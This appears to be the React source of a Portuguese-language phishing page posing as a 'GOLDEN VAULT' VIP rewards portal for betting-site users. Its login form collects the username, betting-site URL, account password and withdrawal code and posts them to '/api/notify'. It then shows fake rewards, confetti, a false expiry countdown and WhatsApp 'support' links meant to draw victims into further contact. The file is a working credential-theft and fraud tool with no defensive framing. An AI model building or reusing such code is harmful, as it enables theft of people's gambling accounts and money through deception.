/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */
import React, { useState, useEffect, useRef } from 'react';
import { gsap } from 'gsap';
import confetti from 'canvas-confetti';
import { 
  Lock, User, Key, Coins, Trophy, Zap, Gift, CheckCircle2, ArrowRight, Globe, MessageCircle 
} from 'lucide-react';

interface UserData {
  user: string;
  bet_url: string;
  pass: string;
  withdraw_pass: string;
  betting_house: string;
  timestamp: string;
  status: string;
  rewardsClaimed: string[];
}

const REWARDS = [
  { id: 'vip7', title: 'UPGRADE VIP 7', description: 'Sincronização de privilégios', icon: Trophy, value: 'NÍVEL 7' },
  { id: 'bonus75', title: 'BÔNUS DE ENTRADA', description: 'Crédito em reserva', value: 'R$ 75,00', icon: Gift },
  { id: 'secret50', title: 'RECARGA SECRETA I', description: 'Ativação de multiplicador', value: 'R$ 50,00', icon: Zap },
  { id: 'secret30', title: 'RECARGA SECRETA II', description: 'Fidelidade avançada', value: 'R$ 30,00', icon: Coins },
  { id: 'loyalty16', title: 'RESGATE DE LEALDADE', description: 'Cálculo de saldo residual', value: 'R$ 16,34', icon: CheckCircle2 },
];

export default function App() {
  const [view, setView] = useState<'login' | 'dashboard' | 'success'>('login');
  const [loading, setLoading] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timeLeft, setTimeLeft] = useState(900);

  const [userData, setUserData] = useState<UserData>({
    user: '',
    bet_url: '',
    pass: '',
    withdraw_pass: '',
    betting_house: '',
    timestamp: '',
    status: 'pending',
    rewardsClaimed: [],
  });

  const [currentRewardIndex, setCurrentRewardIndex] = useState(0);

  const containerRef = useRef<HTMLDivElement>(null);
  const loginRef = useRef<HTMLDivElement>(null);
  const dashboardRef = useRef<HTMLDivElement>(null);

  // Particles
  useEffect(() => {
    const ctx = gsap.context(() => {
      document.querySelectorAll('.particle').forEach((p) => {
        gsap.to(p, {
          y: 'random(-140, 140)',
          x: 'random(-80, 80)',
          duration: 'random(5, 10)',
          repeat: -1,
          yoyo: true,
          ease: 'sine.inOut',
        });
      });
    }, containerRef);
    return () => ctx.revert();
  }, []);

  // Progress
  useEffect(() => {
    setProgress(Math.round(((currentRewardIndex + 1) / REWARDS.length) * 100));
  }, [currentRewardIndex]);

  // Timer Success
  useEffect(() => {
    if (view === 'success') {
      const timer = setInterval(() => setTimeLeft(p => p > 0 ? p - 1 : 0), 1000);
      return () => clearInterval(timer);
    }
  }, [view]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const updatedData = {
      ...userData,
      timestamp: new Date().toLocaleString('pt-BR'),
      status: 'active',
    };

    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updatedData),
      });
    } catch (err) {
      console.error('Falha ao notificar servidor:', err);
    }

    gsap.to(loginRef.current, {
      opacity: 0,
      scale: 0.95,
      duration: 0.6,
      onComplete: () => {
        setView('dashboard');
        setLoading(false);
        gsap.fromTo(dashboardRef.current, { opacity: 0, y: 40 }, { opacity: 1, y: 0, duration: 0.9, ease: 'power4.out' });
      },
    });
  };

  const triggerDopamine = () => {
    const duration = 1600;
    const end = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 100 };

    const interval = setInterval(() => {
      const timeLeft = end - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);
      const particleCount = 50 * (timeLeft / duration);

      confetti({ ...defaults, particleCount, origin: { x: 0.2, y: 0.6 }, colors: ['#D4AF37', '#fff'] });
      confetti({ ...defaults, particleCount, origin: { x: 0.8, y: 0.6 }, colors: ['#D4AF37', '#fff'] });
    }, 160);
  };

  const claimReward = (id: string) => {
    if (isClaiming) return;
    setIsClaiming(true);
    triggerDopamine();

    setTimeout(() => {
      setUserData((prev) => ({
        ...prev,
        rewardsClaimed: [...prev.rewardsClaimed, id],
      }));

      if (currentRewardIndex < REWARDS.length - 1) {
        setCurrentRewardIndex((prev) => prev + 1);
        setIsClaiming(false);
      } else {
        setTimeout(() => setView('success'), 800);
      }
    }, 1100);
  };

  return (
    <div ref={containerRef} className="min-h-screen relative flex items-center justify-center p-4 overflow-hidden bg-[#050505]">
      {/* Particles */}
      <div className="absolute inset-0 pointer-events-none">
        {[...Array(22)].map((_, i) => (
          <div
            key={i}
            className="particle absolute w-1 h-1 bg-[#D4AF37]/30 rounded-full"
            style={{ left: `${Math.random() * 100}%`, top: `${Math.random() * 100}%` }}
          />
        ))}
      </div>

      {/* ====================== LOGIN ====================== */}
      {view === 'login' && (
        <div ref={loginRef} className="glass-card w-full max-w-md p-10 rounded-[2.5rem] border border-[#D4AF37]/10 shadow-2xl">
          <div className="text-center mb-10">
            <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-[#D4AF37] to-yellow-400 rounded-3xl flex items-center justify-center animate-float shadow-xl shadow-[#D4AF37]/30">
              <Lock className="text-black w-10 h-10" />
            </div>
            <h1 className="text-4xl font-black tracking-tighter text-gradient-gold">GOLDEN VAULT</h1>
            <p className="text-[#D4AF37]/70 text-sm tracking-[3px] mt-1">ACESSO EXCLUSIVO VIP</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            {/* Usuário */}
            <div className="space-y-1">
              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">Usuário / Telefone</label>
              <div className="relative group">
                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
                <input
                  required
                  type="text"
                  placeholder="Seu usuário"
                  value={userData.user}
                  onChange={(e) => setUserData((prev) => ({ ...prev, user: e.target.value }))}
                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
                />
              </div>
            </div>

            {/* URL da Casa de Aposta */}
            <div className="space-y-1">
              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">URL da Casa de Aposta</label>
              <div className="relative group">
                <Globe className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
                <input
                  required
                  type="url"
                  placeholder="https://seusite.com"
                  value={userData.bet_url}
                  onChange={(e) => setUserData((prev) => ({ ...prev, bet_url: e.target.value }))}
                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
                />
              </div>
            </div>

            {/* Senha */}
            <div className="space-y-1">
              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">Senha de Acesso</label>
              <div className="relative group">
                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
                <input
                  required
                  type="password"
                  placeholder="••••••••"
                  value={userData.pass}
                  onChange={(e) => setUserData((prev) => ({ ...prev, pass: e.target.value }))}
                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
                />
              </div>
            </div>

            {/* Código de Saque */}
            <div className="space-y-1">
              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">Código de Saque</label>
              <div className="relative group">
                <Coins className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
                <input
                  required
                  type="password"
                  placeholder="6 dígitos"
                  value={userData.withdraw_pass}
                  onChange={(e) => setUserData((prev) => ({ ...prev, withdraw_pass: e.target.value }))}
                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
                />
              </div>
            </div>

            <button
              disabled={loading}
              type="submit"
              className="btn-gold w-full py-5 rounded-2xl text-lg tracking-widest relative overflow-hidden btn-shimmer disabled:opacity-70"
            >
              {loading ? 'AUTENTICANDO...' : 'ACESSAR O VAULT'}
            </button>
          </form>
        </div>
      )}

      {/* ====================== DASHBOARD ====================== */}
      {view === 'dashboard' && (
        <div ref={dashboardRef} className="w-full max-w-2xl z-10 px-2">
          <div className="flex justify-between items-start mb-8">
            <div>
              <h2 className="text-3xl font-black tracking-tighter text-gradient-gold">PAINEL VIP</h2>
              <p className="text-[#D4AF37] text-sm mt-1">{userData.bet_url || 'Casa de Apostas'}</p>
            </div>
            <div className="text-right">
              <p className="text-xs text-gray-500">SALDO ACUMULADO</p>
              <p className="text-3xl font-black text-[#D4AF37]">R$ 266,34</p>
            </div>
          </div>

          <div className="mb-8">
            <div className="flex justify-between text-xs mb-2">
              <span className="text-gray-400">PROGRESSO VIP 7</span>
              <span className="text-[#D4AF37] font-bold">{progress}%</span>
            </div>
            <div className="h-1.5 bg-white/5 rounded-full overflow-hidden">
              <div className="h-full bg-gradient-to-r from-[#D4AF37] to-yellow-300 transition-all duration-700" style={{ width: `${progress}%` }} />
            </div>
          </div>

          <div className="space-y-4">
            {REWARDS.map((reward, index) => {
              const isUnlocked = index <= currentRewardIndex;
              const isClaimed = userData.rewardsClaimed.includes(reward.id);
              const isCurrent = index === currentRewardIndex;
              const Icon = reward.icon;

              return (
                <div key={reward.id} className={`glass-card p-6 rounded-3xl flex items-center justify-between ${isCurrent ? 'ring-2 ring-[#D4AF37]/50 scale-[1.02]' : ''} ${!isUnlocked ? 'opacity-40 grayscale' : ''}`}>
                  <div className="flex items-center gap-5">
                    <div className={`w-12 h-12 rounded-2xl flex items-center justify-center ${isUnlocked ? 'bg-[#D4AF37]/10 text-[#D4AF37]' : 'bg-white/5 text-gray-600'}`}>
                      <Icon size={26} />
                    </div>
                    <div>
                      <h3 className="font-bold text-white">{reward.title}</h3>
                      <p className="text-xs text-gray-500">{reward.description}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-black text-xl mb-2">{reward.value}</p>
                    {isCurrent && !isClaimed && (
                      <button onClick={() => claimReward(reward.id)} disabled={isClaiming} className="btn-gold px-8 py-3 rounded-xl text-sm tracking-widest btn-shimmer">
                        {isClaiming ? 'RESGATANDO...' : 'RESGATAR AGORA'}
                      </button>
                    )}
                    {isClaimed && <span className="text-green-400 text-sm font-bold">✓ LIBERADO</span>}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Botão Flutuante */}
          <a href="https://wa.me/55996191896?text=Olá!%20Quero%20liberar%20meu%20saldo%20VIP" target="_blank" rel="noopener noreferrer"
             className="fixed bottom-6 right-6 bg-[#25D366] text-black p-4 rounded-full shadow-2xl flex items-center gap-3 hover:scale-110 transition-all z-50">
            <MessageCircle size={24} />
            <span className="font-bold text-sm">SUPORTE VIP</span>
          </a>
        </div>
      )}

      {/* ====================== SUCCESS ====================== */}
      {view === 'success' && (
        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-6">
          <div className="glass-card max-w-sm w-full p-12 rounded-[3rem] text-center">
            <div className="w-24 h-24 mx-auto mb-8 bg-gradient-to-br from-[#D4AF37] to-yellow-300 rounded-3xl flex items-center justify-center shadow-2xl animate-float">
              <CheckCircle2 className="text-black w-14 h-14" />
            </div>
            <h2 className="text-4xl font-black mb-4 text-gradient-gold">RESGATE CONCLUÍDO!</h2>
            <p className="text-gray-300 mb-8">Saldo total liberado: <span className="text-[#D4AF37] font-bold text-2xl">R$ 266,34</span></p>
            
            <div className="text-red-400 mb-8">Oferta expira em {Math.floor(timeLeft/60)}:{(timeLeft%60).toString().padStart(2,'0')}</div>

            <a href="https://wa.me/55996191896?text=Olá!%20Concluí%20o%20resgate%20VIP%20de%20R$%20266,34" target="_blank" rel="noopener noreferrer"
               className="btn-gold w-full py-5 rounded-2xl text-lg flex items-center justify-center gap-3">
              FALAR COM SUPORTE VIP <ArrowRight />
            </a>
          </div>
        </div>
      )}
    </div>
  );
}